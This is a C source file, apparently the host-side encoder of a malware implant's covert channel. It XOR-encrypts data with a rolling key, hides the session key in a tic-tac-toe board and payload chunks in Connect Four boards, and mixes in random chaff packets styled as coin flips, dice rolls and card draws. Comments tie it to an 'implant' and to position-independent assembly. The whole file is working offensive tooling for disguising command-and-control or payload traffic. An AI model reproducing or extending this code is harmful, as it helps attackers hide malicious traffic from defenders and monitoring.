// encoder.c - Host-side packet generation

#include "encoder.h"
#include "utils.h"
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdio.h>

// bootstrap key (must match implant)
#define BOOTSTRAP_KEY 0x55

static unsigned int gSeed = 0;

// ==========================================
// internal helpers
// ==========================================

void seedInit(uint32_t seedValue) 
{
    gSeed = seedValue ? seedValue : (uint32_t)time(NULL);
    srand(gSeed);
}

// host-side crypto (must match pic.h inline asm exactly)
static void hostCrypt(unsigned char* buffer, int len, unsigned char key) 
{
    for (int i = 0; i < len; i++) 
    {
        buffer[i] ^= key;
        // key schedule: ROL 1 + 0x55
        key = ((key << 1) | (key >> 7)) + 0x55;
    }
}

static uint64_t bitsToU64(const char* bits, int n) 
{
    uint64_t val = 0;
    for (int i = 0; i < n; i++) 
    {
        val = (val << 1) | (bits[i] == '1' ? 1 : 0);
    }
    return val;
}

static void u64ToBits(uint64_t val, char* buf, int n) 
{
    for (int i = n - 1; i >= 0; i--) 
    {
        buf[i] = (val & 1) ? '1' : '0';
        val >>= 1;
    }
    buf[n] = '\0';
}

static void u64ToBaseN(uint64_t val, uint8_t* out, int len, int base) 
{
    for (int i = 0; i < len; i++) 
    {
        out[i] = val % base;
        val /= base;
    }
}

static uint64_t baseNToU64(const uint8_t* data, int len, int base) 
{
    uint64_t val = 0;
    uint64_t mult = 1;
    for (int i = 0; i < len; i++) 
    {
        val += data[i] * mult;
        mult *= base;
    }
    return val;
}

// ==========================================
// game engine encoders/decoders
// ==========================================

// tic-tac-toe (9 cells, base-3)
static void encodeTTT(const char* bits, state_t* state) 
{
    uint64_t val = bitsToU64(bits, 14);
    u64ToBaseN(val, state->data, 9, 3);
    state->size = 9;
    state->bits_encoded = 14;
}

static int decodeTTT(const state_t* state, char* out) 
{
    uint64_t val = baseNToU64(state->data, 9, 3);
    u64ToBits(val, out, 14);
    return 14;
}

// coin flip (1 bit)
static void encodeCoin(const char* bits, state_t* state) 
{
    state->data[0] = (bits[0] == '1');
    state->size = 1;
    state->bits_encoded = 1;
}

static int decodeCoin(const state_t* state, char* out) 
{
    out[0] = state->data[0] ? '1' : '0';
    out[1] = '\0';
    return 1;
}

// dice roll (2 bits)
static void encodeDice(const char* bits, state_t* state) 
{
    uint64_t val = bitsToU64(bits, 2);
    state->data[0] = (uint8_t)val; 
    state->size = 1;
    state->bits_encoded = 2;
}

static int decodeDice(const state_t* state, char* out) 
{
    u64ToBits(state->data[0], out, 2);
    return 2;
}

// connect four (42 cells, base-3)
static void encodeC4(const char* bits, state_t* state) 
{
    uint64_t val = bitsToU64(bits, 60); 
    u64ToBaseN(val, state->data, 42, 3);
    state->size = 42;
    state->bits_encoded = 60;
}

static int decodeC4(const state_t* state, char* out) 
{
    uint64_t val = baseNToU64(state->data, 42, 3);
    u64ToBits(val, out, 60);
    return 60;
}

// rock paper scissors (3 choices)
static void encodeRPS(const char* bits, state_t* state) 
{
    uint64_t val = bitsToU64(bits, 3);
    state->data[0] = (uint8_t)val;
    state->size = 1;
    state->bits_encoded = 3;
}

static int decodeRPS(const state_t* state, char* out) 
{
    if (state->data[0] >= 8) return 0;
    u64ToBits(state->data[0], out, 3);
    return 3;
}

// card draw (5 bits = 32 cards)
static void encodeCard(const char* bits, state_t* state) 
{
    uint64_t val = bitsToU64(bits, 5);
    state->data[0] = (uint8_t)val;
    state->size = 1;
    state->bits_encoded = 5;
}

static int decodeCard(const state_t* state, char* out) 
{
    if (state->data[0] >= 32) return 0;
    u64ToBits(state->data[0], out, 5);
    return 5;
}

// ==========================================
// public api
// ==========================================

int getCapacity(game_engine_t engine) 
{
    switch(engine) 
    {
        case GAME_TTT:       return 14;
        case GAME_COIN:      return 1;
        case GAME_DICE:      return 2;
        case GAME_CONNECT4:  return 60;
        case GAME_RPS:       return 3;
        case GAME_CARD:      return 5;
        default:             return 0;
    }
}

state_t encode(game_engine_t engine, const char* bits) 
{
    state_t state;
    memset(&state, 0, sizeof(state));
    state.engine = engine;
    
    switch(engine) 
    {
        case GAME_TTT:       encodeTTT(bits, &state); break;
        case GAME_COIN:      encodeCoin(bits, &state); break;
        case GAME_DICE:      encodeDice(bits, &state); break;
        case GAME_CONNECT4:  encodeC4(bits, &state); break;
        case GAME_RPS:       encodeRPS(bits, &state); break;
        case GAME_CARD:      encodeCard(bits, &state); break;
        default: break;
    }
    return state;
}

int decode(const state_t* state, char* out) 
{
    switch(state->engine) 
    {
        case GAME_TTT:       return decodeTTT(state, out);
        case GAME_COIN:      return decodeCoin(state, out);
        case GAME_DICE:      return decodeDice(state, out);
        case GAME_CONNECT4:  return decodeC4(state, out);
        case GAME_RPS:       return decodeRPS(state, out);
        case GAME_CARD:      return decodeCard(state, out);
        default: return 0;
    }
}

const char* getEngineName(game_engine_t engine) 
{
    switch(engine) 
    {
        case GAME_TTT:       return "Tic-Tac-Toe";
        case GAME_COIN:      return "Coin Flip";
        case GAME_DICE:      return "Dice Roll";
        case GAME_CONNECT4:  return "Connect Four";
        case GAME_RPS:       return "Rock-Paper-Scissors";
        case GAME_CARD:      return "Card Draw";
        default:             return "Unknown";
    }
}

// ==========================================
// chunked protocol (v1.1)
// ==========================================

packet_t* encodeChunkedStream(const void* data, size_t len) 
{
    packet_t* head = NULL;
    packet_t* tail = NULL;
    
    unsigned char sessionKey = (unsigned char)(rand() % 255);
    if (sessionKey == BOOTSTRAP_KEY || sessionKey == 0) 
        sessionKey = 0x99;
    
    printf("[INFO] session key: 0x%02X\n", sessionKey);
    
    char keyBits[15];
    unsigned char encryptedKey = sessionKey ^ BOOTSTRAP_KEY;
    
    for (int i = 7; i >= 0; i--) 
    {
        keyBits[7-i] = (encryptedKey >> i) & 1 ? '1' : '0';
    }
    for (int i = 8; i < 14; i++) 
    {
        keyBits[i] = (rand() % 2) ? '1' : '0';
    }
    keyBits[14] = '\0';
    
    packet_t* keyNode = malloc(sizeof(packet_t));
    keyNode->state = encode(GAME_TTT, keyBits);
    keyNode->next = NULL;
    
    head = keyNode;
    tail = keyNode;
    
    unsigned char* encryptedBuf = malloc(len);
    if (!encryptedBuf) return NULL;
    memcpy(encryptedBuf, data, len);
    
    hostCrypt(encryptedBuf, len, sessionKey);
    
    int chunkSize = 6;  
    int numChunks = (len + chunkSize - 1) / chunkSize;
    
    printf("[INFO] chunking %zu bytes into %d frames\n", len, numChunks);
    
    for (int chunkIdx = 0; chunkIdx < numChunks; chunkIdx++) 
    {
        char chunkBits[61];
        
        uint8_t seq = chunkIdx & 0xFF;
        for (int i = 0; i < 8; i++) 
        {
            chunkBits[i] = (seq & (1 << (7-i))) ? '1' : '0';
        }
        
        int offset = chunkIdx * chunkSize;
        
        for (int byteIdx = 0; byteIdx < 6; byteIdx++) 
        {
            uint8_t byteVal = ((size_t)(offset + byteIdx) < len) ? 
                              encryptedBuf[offset + byteIdx] : 0;
            for (int bit = 0; bit < 8; bit++) 
            {
                int bitPos = 8 + byteIdx * 8 + bit;
                chunkBits[bitPos] = (byteVal & (1 << (7-bit))) ? '1' : '0';
            }
        }
        
        for (int i = 56; i < 60; i++) 
        {
            chunkBits[i] = (rand() % 2) ? '1' : '0';
        }
        chunkBits[60] = '\0';
        
        packet_t* node = malloc(sizeof(packet_t));
        node->state = encode(GAME_CONNECT4, chunkBits);
        node->next = NULL;
        
        tail->next = node;
        tail = node;
        
        if (chunkIdx < numChunks - 1 && rand() % 3 == 0) 
        {
            game_engine_t chaffEngines[] = {GAME_COIN, GAME_DICE, GAME_RPS, GAME_CARD};
            game_engine_t chaffEngine = chaffEngines[rand() % 4];
            
            int chaffCap = getCapacity(chaffEngine);
            char chaffBits[65];
            for (int i = 0; i < chaffCap; i++) 
            {
                chaffBits[i] = (rand() % 2) ? '1' : '0';
            }
            chaffBits[chaffCap] = '\0';
            
            packet_t* chaff = malloc(sizeof(packet_t));
            chaff->state = encode(chaffEngine, chaffBits);
            chaff->next = NULL;
            
            tail->next = chaff;
            tail = chaff;
        }
    }
    
    free(encryptedBuf);
    
    int totalPackets = 0;
    packet_t* curr = head;
    while (curr) 
    {
        totalPackets++;
        curr = curr->next;
    }
    printf("[INFO] generated %d packets (%d data + %d chaff)\n", 
           totalPackets, numChunks + 1, totalPackets - numChunks - 1);
    
    return head;
}

void freeStream(packet_t* head) 
{
    while (head) 
    {
        packet_t* next = head->next;
        free(head);
        head = next;
    }
}

